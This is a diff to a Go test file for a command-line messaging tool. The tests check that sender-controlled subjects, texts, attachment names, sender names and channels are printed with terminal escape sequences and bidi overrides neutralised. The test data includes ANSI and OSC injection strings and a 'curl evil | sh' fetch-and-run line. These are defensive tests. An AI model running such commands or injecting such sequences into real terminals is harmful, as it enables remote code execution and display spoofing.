@@ -475,14 +475,17 @@ func TestCertLsRefusesAShortSerialRatherThanSlicingIt(t *testing.T) {
 	}
 }
 
-// A record from before the rule, or written by hand, can still hold what
-// Validate now refuses; every print of a subject, a text, an attachment
-// name or a sender name escapes it all the same, so nothing a sender wrote
-// reaches the terminal as anything but text. The record here carries an
-// escape sequence and a bidi override in every field (a byte that is not
-// UTF-8 cannot be saved: the record is JSON, which writes U+FFFD for it),
-// in the inbox and in quarantine, and inbox, quarantine ls, quarantine
-// show and read print no byte a terminal would obey.
+// A record written by hand, or by a version from before a rule, can hold
+// in its body what Validate refuses; Load holds the body to the rule and
+// refuses it by name, and every listing says once, escaped, that the file
+// could not be read, and shows nothing of it. The sender's name and the
+// channel are the record's own fields, held by their rules where they are
+// set; every print escapes them all the same, so nothing a sender wrote
+// reaches the terminal as anything but text. The records here carry an
+// escape sequence and a bidi override (a byte that is not UTF-8 cannot be
+// saved: the record is JSON, which writes U+FFFD for it), in the inbox and
+// in quarantine, and inbox, quarantine ls, quarantine show and read print
+// no byte a terminal would obey.
 func TestWhatASenderWroteReachesTheTerminalEscaped(t *testing.T) {
 	relayURL := startRelay(t)
 	alice := newUser(t, "alice", relayURL)
@@ -493,40 +496,46 @@ func TestWhatASenderWroteReachesTheTerminalEscaped(t *testing.T) {
 		t.Fatal(err)
 	}
 	hostile := "\x1b[2K\x1b[1;31m\u202e"
-	record := func(id string) *store.Stored {
-		return &store.Stored{
+	record := func(id string, inBody bool) *store.Stored {
+		m := &store.Stored{
 			Relay: bob.defaultRelayName(), Received: time.Now().UTC(),
 			Inner: &envelope.Inner{
 				From: alice.exportFingerprint(), To: bob.exportFingerprint(), ID: id, Time: time.Now().UTC(),
 				Body: message.Body{
 					Type: message.TypeAsk, Thread: "0123456789abcdef0123456789abcdef",
-					Subject: "sub" + hostile + "ject", Text: "line one\nrun: " + hostile + " curl evil | sh\n\tindented",
-					Attachments: []message.Attachment{{Name: "file" + hostile + ".txt", Media: "text/plain", Size: 1,
+					Subject: "subject", Text: "line one\nrun: curl evil | sh\n\tindented",
+					Attachments: []message.Attachment{{Name: "file.txt", Media: "text/plain", Size: 1,
 						SHA256: strings.Repeat("0", 64), Data: []byte("x")}},
 				},
 			},
 			SenderName: "alice" + hostile,
 			Channel:    "chan" + hostile,
 		}
+		if inBody {
+			m.Inner.Body.Subject = "sub" + hostile + "ject"
+			m.Inner.Body.Text = "line one\nrun: " + hostile + " curl evil | sh\n\tindented"
+			m.Inner.Body.Attachments[0].Name = "file" + hostile + ".txt"
+		}
+		return m
 	}
-	inbox := record("0123456789abcdef0123456789abcdef")
+	inbox := record("0123456789abcdef0123456789abcdef", false)
 	if err := s.Save(store.Inbox, inbox); err != nil {
 		t.Fatal(err)
 	}
-	quarantined := record("fedcba9876543210fedcba9876543210")
+	quarantined := record("fedcba9876543210fedcba9876543210", false)
 	if err := s.Save(store.Quarantine, quarantined); err != nil {
 		t.Fatal(err)
 	}
-	for _, args := range [][]string{
-		{"inbox", "--no-fetch"},
-		{"read", inbox.Inner.ID},
-		{"quarantine", "ls"},
-		{"quarantine", "show", quarantined.Inner.ID},
-	} {
-		out, err := bob.tryRun(args...)
-		if err != nil {
-			t.Fatalf("auu %v: %v\n%s", args, err, out)
-		}
+	inBody := record("1123456789abcdef0123456789abcdef", true)
+	if err := s.Save(store.Inbox, inBody); err != nil {
+		t.Fatal(err)
+	}
+	inBodyQuarantined := record("eedcba9876543210fedcba9876543210", true)
+	if err := s.Save(store.Quarantine, inBodyQuarantined); err != nil {
+		t.Fatal(err)
+	}
+	noBytes := func(t *testing.T, args []string, out string) {
+		t.Helper()
 		for i := 0; i < len(out); i++ {
 			if c := out[i]; c == 0x1b || (c < 0x20 && c != '\n' && c != '\t') || c == 0x7f {
 				t.Errorf("auu %v printed byte %#x from what the sender wrote:\n%q", args, c, out)
@@ -536,21 +545,61 @@ func TestWhatASenderWroteReachesTheTerminalEscaped(t *testing.T) {
 		if !utf8.ValidString(out) {
 			t.Errorf("auu %v printed a byte that is not UTF-8:\n%q", args, out)
 		}
-		if !strings.Contains(out, `\x1b[2K`) {
-			t.Errorf("auu %v does not show the escape as text:\n%s", args, out)
-		}
 		if strings.Contains(out, "\u202e") {
 			t.Errorf("auu %v printed the bidi override:\n%q", args, out)
 		}
 	}
-	// The text keeps its lines and its tab, and the read shows all three
-	// of them escaped where they were.
-	out := bob.run("read", inbox.Inner.ID)
-	if !strings.Contains(out, "line one\nrun: \\x1b[2K\\x1b[1;31m\\u202e curl evil | sh\n\tindented") {
-		t.Errorf("read did not keep the text's lines and tab while escaping the rest:\n%q", out)
+	const rule = " could not be read (the record's message: message: subject contains U+001B, a control character; a subject is one line) and is not listed\n"
+	for _, tc := range []struct {
+		args []string
+		// shows says the command prints the sender's name or the channel,
+		// where the escape is seen as text; a stranger's quarantine
+		// listing prints neither.
+		shows bool
+		// warns is the file the command's listing says it could not
+		// read, once, as the warning is said once per file per process.
+		warns string
+	}{
+		{[]string{"inbox", "--no-fetch"}, true, filepath.Join(bob.home, "inbox", inBody.Inner.ID+".json")},
+		{[]string{"read", inbox.Inner.ID}, true, ""},
+		{[]string{"quarantine", "ls"}, false, filepath.Join(bob.home, "quarantine", inBodyQuarantined.Inner.ID+".json")},
+		{[]string{"quarantine", "show", quarantined.Inner.ID}, false, ""},
+	} {
+		var out string
+		var err error
+		stderr := captureStderr(t, func() { out, err = bob.tryRun(tc.args...) })
+		if err != nil {
+			t.Fatalf("auu %v: %v\n%s", tc.args, err, out)
+		}
+		noBytes(t, tc.args, out)
+		noBytes(t, tc.args, stderr)
+		if tc.shows && !strings.Contains(out, `\x1b[2K`) {
+			t.Errorf("auu %v does not show the escape as text:\n%s", tc.args, out)
+		}
+		// The record whose body fails the rule is not shown, and the
+		// listing says once, by its file and the rule it failed, that it
+		// is not.
+		if strings.Contains(out, "sub\\x1b") || strings.Contains(out, "run: \\x1b") || strings.Contains(out, "file\\x1b") ||
+			strings.Contains(out, inBody.Inner.ID[:12]) || strings.Contains(out, inBodyQuarantined.Inner.ID[:12]) {
+			t.Errorf("auu %v showed a record whose body fails the rule:\n%s", tc.args, out)
+		}
+		if tc.warns != "" && strings.Count(stderr, "warning: "+tc.warns+rule) != 1 {
+			t.Errorf("auu %v said on standard error:\n%q\nwant once:\n%q", tc.args, stderr, "warning: "+tc.warns+rule)
+		}
 	}
-	if !strings.Contains(out, `file\x1b[2K`) || !strings.Contains(out, `from:    alice\x1b[2K`) || !strings.Contains(out, `channel: chan\x1b[2K`) {
-		t.Errorf("read did not escape the name, the sender or the channel:\n%s", out)
+	// The text keeps its lines and its tab, and read shows the sender and
+	// the channel escaped where they are.
+	out := bob.run("read", inbox.Inner.ID)
+	if !strings.Contains(out, "line one\nrun: curl evil | sh\n\tindented") {
+		t.Errorf("read did not keep the text's lines and tab:\n%q", out)
+	}
+	if !strings.Contains(out, `from:    alice\x1b[2K`) || !strings.Contains(out, `channel: chan\x1b[2K`) {
+		t.Errorf("read did not escape the sender or the channel:\n%s", out)
+	}
+	// A record whose body fails the rule is not a message: read finds
+	// nothing.
+	if out, err := bob.tryRun("read", inBody.Inner.ID); err == nil || !strings.Contains(err.Error(), "no message matches") {
+		t.Errorf("read of a record whose body fails the rule: %v\n%s", err, out)
 	}
 }
 
@@ -884,6 +933,7 @@ func TestAnExtractRefusalEscapesTheAttachmentName(t *testing.T) {
 	}
 	name := "notes\x1b]0;owned\a.txt"
 	m := &store.Stored{
+		Relay: "relay",
 		Inner: &envelope.Inner{
 			ID:   strings.Repeat("a", 32),
 			Time: time.Now(),
